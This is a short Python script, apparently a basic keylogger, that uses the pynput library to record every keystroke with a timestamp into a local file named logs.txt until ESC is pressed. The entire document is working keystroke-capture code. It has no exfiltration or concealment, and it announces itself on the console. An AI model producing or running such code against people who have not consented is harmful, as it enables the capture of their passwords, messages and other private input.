from pynput import keyboard
from datetime import datetime

log_file = "logs.txt"

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] {key_data}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger started... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()